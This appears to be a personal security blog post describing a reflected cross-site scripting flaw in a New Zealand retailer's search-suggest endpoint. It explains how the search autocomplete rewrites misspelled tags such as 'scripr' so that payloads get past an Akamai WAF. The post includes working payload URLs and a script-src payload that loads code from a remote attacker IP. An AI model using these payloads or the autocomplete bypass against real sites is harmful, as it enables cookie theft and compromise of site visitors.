<!DOCTYPE html>
<html lang="en-NZ" dir="ltr">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8">
<meta name="viewport" content="width=device-width">
<title>

  Bypassing a WAF With Autocomplete | Jess&#39;s Cafe

</title>
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=DM Mono">

<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Noto+Sans:ital,wght@0,100..900;1,100..900&family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="/css/styles.css">


    <script src="/js/main.js"></script>

    
      <link rel="stylesheet" href="/css/single.css">
  

  </head>
  <body>
    <div class="container">
      
  <div class="left-bar">
    
      <a href="/"><img class="jess-cafe-coffee" src="/images/home.png"></a>
    
    
      <a href="/posts"><img class="blog-icon" src="/images/blog3.png"></a>
    
    
      <a><img class="back-button" src="/images/back-button.svg"></a>
    
  </div>
  <div class="post">
    <div class="top">
      
        <a><img class="back-button-reverse" src="/images/back-button-reverse.svg"></a>
      
      <div class="content-metadata">
        <h1 class="title">Bypassing a WAF With Autocomplete</h1>
        
          <img class="separator-line" src="/images/separator-line.svg">
        
        
        
        <time datetime="2024-07-15T10:33:59&#43;12:00">July 15, 2024</time>
      </div>
    </div>
    <div class="content">
      <p>A few months ago, I was looking at a popular New Zealand website. I came across their search feature.
and found that when I interacted with the search box, it queried this endpoint to fetch the search results</p>
<p><code>&lt;snip&gt;/ViewSuggestSearch-Suggest&amp;SearchTerm=tshirt</code></p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>	&lt;<span style="color:#000080">div</span> <span style="color:#008080">class</span><span style="color:#000;font-weight:bold">=</span><span style="color:#d14">&#34;suggest-results-list search-spring&#34;</span>&gt;
</span></span><span style="display:flex;"><span>		&lt;<span style="color:#000080">button</span> <span style="color:#008080">type</span><span style="color:#000;font-weight:bold">=</span><span style="color:#d14">&#34;button&#34;</span> <span style="color:#008080">class</span><span style="color:#000;font-weight:bold">=</span><span style="color:#d14">&#34;close&#34;</span> <span style="color:#008080">title</span><span style="color:#000;font-weight:bold">=</span><span style="color:#d14">&#34;Close&#34;</span>&gt;&lt;<span style="color:#000080">span</span>&gt;×&lt;/<span style="color:#000080">span</span>&gt;&lt;/<span style="color:#000080">button</span>&gt;
</span></span><span style="display:flex;"><span>		&lt;<span style="color:#000080">div</span> <span style="color:#008080">class</span><span style="color:#000;font-weight:bold">=</span><span style="color:#d14">&#34;suggest-suggestion-list col-xs-6&#34;</span>&gt;
</span></span><span style="display:flex;"><span>			&lt;<span style="color:#000080">h3</span>&gt;Search Suggestion&lt;/<span style="color:#000080">h3</span>&gt;
</span></span><span style="display:flex;"><span>			&lt;<span style="color:#000080">ul</span>&gt;
</span></span><span style="display:flex;"><span>				&lt;<span style="color:#000080">li</span> <span style="color:#008080">class</span><span style="color:#000;font-weight:bold">=</span><span style="color:#d14">&#34;classic&#34;</span>&gt;
</span></span><span style="display:flex;"><span>					&lt;<span style="color:#000080">button</span> <span style="color:#008080">type</span><span style="color:#000;font-weight:bold">=</span><span style="color:#d14">&#34;button&#34;</span> 
</span></span><span style="display:flex;"><span>							<span style="color:#008080">data-search-result</span><span style="color:#000;font-weight:bold">=</span><span style="color:#d14">&#34;tshirt&#34;</span> 
</span></span><span style="display:flex;"><span>							<span style="color:#008080">class</span><span style="color:#000;font-weight:bold">=</span><span style="color:#d14">&#34;search-result&#34;</span>&gt;
</span></span><span style="display:flex;"><span>						&lt;<span style="color:#000080">span</span> <span style="color:#008080">class</span><span style="color:#000;font-weight:bold">=</span><span style="color:#d14">&#34;ish-searchTerm&#34;</span>&gt;tshirt&lt;/<span style="color:#000080">span</span>&gt;
</span></span><span style="display:flex;"><span>					&lt;/<span style="color:#000080">button</span>&gt;
</span></span><span style="display:flex;"><span>				&lt;/<span style="color:#000080">li</span>&gt;
</span></span><span style="display:flex;"><span>			&lt;/<span style="color:#000080">ul</span>&gt;
</span></span><span style="display:flex;"><span>		&lt;/<span style="color:#000080">div</span>&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>(A bunch of products)...
</span></span></code></pre></div><p>The page would make these <code>HTTP GET</code> requests, and the endpoint would return a little HTML widget
that would then be embedded in the page. I tried injecting a HTML tag to test if this is vulnerable:</p>
<p><code>/ViewSuggestSearch-Suggest&amp;SearchTerm=&lt;h1&gt;HACKS?!&lt;/h1&gt;</code></p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>	&lt;<span style="color:#000080">div</span> <span style="color:#008080">class</span><span style="color:#000;font-weight:bold">=</span><span style="color:#d14">&#34;suggest-results-list search-spring&#34;</span>&gt;
</span></span><span style="display:flex;"><span>		&lt;<span style="color:#000080">button</span> <span style="color:#008080">type</span><span style="color:#000;font-weight:bold">=</span><span style="color:#d14">&#34;button&#34;</span> <span style="color:#008080">class</span><span style="color:#000;font-weight:bold">=</span><span style="color:#d14">&#34;close&#34;</span> <span style="color:#008080">title</span><span style="color:#000;font-weight:bold">=</span><span style="color:#d14">&#34;Close&#34;</span>&gt;&lt;<span style="color:#000080">span</span>&gt;×&lt;/<span style="color:#000080">span</span>&gt;&lt;/<span style="color:#000080">button</span>&gt;
</span></span><span style="display:flex;"><span>		&lt;<span style="color:#000080">div</span> <span style="color:#008080">class</span><span style="color:#000;font-weight:bold">=</span><span style="color:#d14">&#34;suggest-suggestion-list col-xs-6&#34;</span>&gt;
</span></span><span style="display:flex;"><span>			&lt;<span style="color:#000080">h3</span>&gt;Search Suggestion&lt;/<span style="color:#000080">h3</span>&gt;
</span></span><span style="display:flex;"><span>			&lt;<span style="color:#000080">ul</span>&gt;
</span></span><span style="display:flex;"><span>				&lt;<span style="color:#000080">li</span> <span style="color:#008080">class</span><span style="color:#000;font-weight:bold">=</span><span style="color:#d14">&#34;classic&#34;</span>&gt;
</span></span><span style="display:flex;"><span>					&lt;<span style="color:#000080">button</span> <span style="color:#008080">type</span><span style="color:#000;font-weight:bold">=</span><span style="color:#d14">&#34;button&#34;</span> 
</span></span><span style="display:flex;"><span>							<span style="color:#008080">data-search-result</span><span style="color:#000;font-weight:bold">=</span><span style="color:#d14">&#34;&lt;h1&gt;hack?!&lt;/h1&gt;&#34;</span> 
</span></span><span style="display:flex;"><span>							<span style="color:#008080">class</span><span style="color:#000;font-weight:bold">=</span><span style="color:#d14">&#34;search-result&#34;</span>&gt;
</span></span><span style="display:flex;"><span>					&lt;<span style="color:#000080">h1</span>&gt;hack?!&lt;/<span style="color:#000080">h1</span>&gt;
</span></span><span style="display:flex;"><span>					&lt;/<span style="color:#000080">button</span>&gt;
</span></span><span style="display:flex;"><span>				&lt;/<span style="color:#000080">li</span>&gt;
</span></span><span style="display:flex;"><span>			&lt;/<span style="color:#000080">ul</span>&gt;
</span></span><span style="display:flex;"><span>		&lt;/<span style="color:#000080">div</span>&gt;
</span></span></code></pre></div><p>Oops, that&rsquo;s not great—our input gets reflected without being sanitized! That means we can get
JavaScript execution, grab some cookies, and pwn people now… right? Let’s find out:</p>
<p><code>/ViewSuggestSearch-Suggest&amp;SearchTerm=&lt;script&gt;alert(document.domain)&lt;/script&gt;</code></p>
<p><img src="images/waf-block-screen.png" alt="Website WAF Block screen"></p>
<p>Wow, that&rsquo;s a crazy coincidence! Isn’t it? Let’s look a little closer…</p>
<p><img src="images/waf-image-link.png" alt="WAF image link hover"></p>
<p>Huh, okay, unfortunately, we have to work a bit harder. This company has paid attention to the
security checklist and installed a Web Application Firewall (WAF), namely Akamai&rsquo;s &lsquo;Kona Site
Defender&rsquo;. You can read more about WAFs
<a href="https://owasp.org/www-community/Web_Application_Firewall">here</a>, but the idea is that if we can’t
stop all the vulnerabilities, we can at least make exploitation harder by blocking suspicious
requests.</p>
<p>Clearly this is a problem, how do we bypass it?</p>
<p>Looking back at our first injection attempt, we can notice something interesting: the word &ldquo;HACKS&rdquo;
got changed to &ldquo;hack&rdquo;. This is likely due to an autocomplete feature, by the nature of it being a
search engine. This may prove useful in bypassing the WAF. Can we somehow craft a payload that slips
past the WAF, is then transformed by this autocomplete feature into something malicious,
and then reflected to the victim&rsquo;s browser? Well, we’ve already seen that it seems to disregard the
non-alphanumeric characters from its autocompleting (i.e., <code>&lt;&gt;/</code>). That’s good; we only have to
worry about the words. Let&rsquo;s try:</p>
<p><code>/ViewSuggestSearch-Suggest&amp;SearchTerm=&lt;script&gt;</code></p>
<p>Blocked, ok thats expected,</p>
<p>What if we try “scripr”, a subtle misspelling of “script”? Will it autocomplete it?</p>
<p><code>/ViewSuggestSearch-Suggest&amp;SearchTerm=&lt;scripr&gt;</code></p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>&lt;<span style="color:#000080">li</span> <span style="color:#008080">class</span><span style="color:#000;font-weight:bold">=</span><span style="color:#d14">&#34;classic&#34;</span>&gt;
</span></span><span style="display:flex;"><span>	&lt;<span style="color:#000080">button</span> <span style="color:#008080">type</span><span style="color:#000;font-weight:bold">=</span><span style="color:#d14">&#34;button&#34;</span> 
</span></span><span style="display:flex;"><span>			<span style="color:#008080">data-search-result</span><span style="color:#000;font-weight:bold">=</span><span style="color:#d14">&#34;&lt;script&gt;&#34;</span> 
</span></span><span style="display:flex;"><span>			<span style="color:#008080">class</span><span style="color:#000;font-weight:bold">=</span><span style="color:#d14">&#34;search-result&#34;</span>&gt;
</span></span><span style="display:flex;"><span>		&lt;<span style="color:#000080">span</span> <span style="color:#008080">class</span><span style="color:#000;font-weight:bold">=</span><span style="color:#d14">&#34;ish-searchTerm&#34;</span>&gt;&lt;<span style="color:#000080">script</span>&gt;<span style="color:#a61717;background-color:#e3d2d2">&lt;/span&gt;</span>
</span></span><span style="display:flex;"><span>	&lt;/<span style="color:#000080">button</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#000080">li</span>&gt;
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p>Perfect! That looks good; the WAF doesn&rsquo;t block it. Let&rsquo;s build it up more. It turns out the
autocomplete doesn’t like the second word to be followed by a &ldquo;&gt;&rdquo;, so let&rsquo;s add a &ldquo;/&rdquo; which the
browser will ignore.</p>
<p><code>/ViewSuggestSearch-Suggest&amp;SearchTerm=&lt;scripr&gt;&lt;/scripr/&gt;</code></p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>&lt;<span style="color:#000080">li</span> <span style="color:#008080">class</span><span style="color:#000;font-weight:bold">=</span><span style="color:#d14">&#34;classic&#34;</span>&gt;
</span></span><span style="display:flex;"><span>	&lt;<span style="color:#000080">button</span> <span style="color:#008080">type</span><span style="color:#000;font-weight:bold">=</span><span style="color:#d14">&#34;button&#34;</span> 
</span></span><span style="display:flex;"><span>			<span style="color:#008080">data-search-result</span><span style="color:#000;font-weight:bold">=</span><span style="color:#d14">&#34;&lt;script&gt;&lt;/script&gt;&#34;</span> 
</span></span><span style="display:flex;"><span>			<span style="color:#008080">class</span><span style="color:#000;font-weight:bold">=</span><span style="color:#d14">&#34;search-result&#34;</span>&gt;
</span></span><span style="display:flex;"><span>		&lt;<span style="color:#000080">span</span> <span style="color:#008080">class</span><span style="color:#000;font-weight:bold">=</span><span style="color:#d14">&#34;ish-searchTerm&#34;</span>&gt;&lt;<span style="color:#000080">script</span>&gt;<span style="color:#a61717;background-color:#e3d2d2">&lt;/script/&gt;&lt;/span&gt;</span>
</span></span><span style="display:flex;"><span>	&lt;/<span style="color:#000080">button</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#000080">li</span>&gt;
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p>Sweet, it also seems that the WAF doesn’t like &ldquo;alert(&rdquo;, so we&rsquo;ll use &ldquo;alertt(&rdquo; instead.</p>
<p><code>/ViewSuggestSearch-Suggest&amp;SearchTerm=&lt;scripr&gt;alertt(document.domain)&lt;/scripr/&gt;</code></p>
<p><img src="images/alert-box.png" alt="Alert Box"></p>
<p>Yay! we did it :3, In terms of further exploitation, a payload such as
<code>&lt;scripr/src=&quot;//&lt;remote-ip&gt;/&quot;&gt;&lt;/scripr/&gt;</code> seems to work and Note: It&rsquo;s much easier here with an ip
address as domain names will get autocompleted.</p>
<p>Overall this was a fun little bug to discover, and demonstrates how to utilize these types of
transformations to bypass WAF&rsquo;s and filters.</p>
    </div>
  </div>

    </div>
  </body>
</html>
